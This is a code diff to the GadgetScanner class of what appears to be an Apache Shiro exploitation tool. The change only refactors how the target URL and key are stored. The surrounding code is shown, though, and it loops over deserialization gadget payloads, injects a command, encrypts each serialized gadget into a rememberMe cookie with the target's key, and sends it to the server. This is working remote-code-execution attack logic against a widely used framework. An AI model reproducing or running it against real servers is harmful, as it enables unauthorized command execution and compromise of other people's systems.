@@ -33,19 +33,11 @@ public class GadgetScanner implements ShiroScanner {
      */
     private static final Set<String> UsefulGadget = new HashSet<>();
 
-    private String base;
+    private final ShiroTarget target;
 
-    private String key;
-
-    public GadgetScanner(String base, String key) {
-        this.base = base;
-        this.key = key;
+    public GadgetScanner(ShiroTarget target) {
+        this.target = target;
     }
-
-//    @Override
-//    public void setBase(String base) {
-//        this.base = base;
-//    }
 
     @Override
     public void scan() throws Exception {
@@ -56,14 +48,14 @@ public class GadgetScanner implements ShiroScanner {
         set.remove(ScanKey.class);
         for (Class<? extends ObjectPayload> payloadClass : set) {
             Util util = new Util();
-            ShiroHttpConnection connection = new ShiroHttpConnection(base);
+            ShiroHttpConnection connection = new ShiroHttpConnection(target.getBase());
             String id = RandomID.randomID();
             String command = String.format(commandTemplate, identifier, id);
             ObjectPayload obj = payloadClass.newInstance();
             System.out.println("[+] Test Gadget: " + payloadClass.getSimpleName());
             Object payload = obj.getObjectPayload(command);
             byte[] serialize = util.serialize(payload);
-            String rememberMe = util.getRememberMe(serialize, key);
+            String rememberMe = util.getRememberMe(serialize, target.getKey());
             connection.sendRememberMe(rememberMe, false);
 
             Thread.sleep(500);
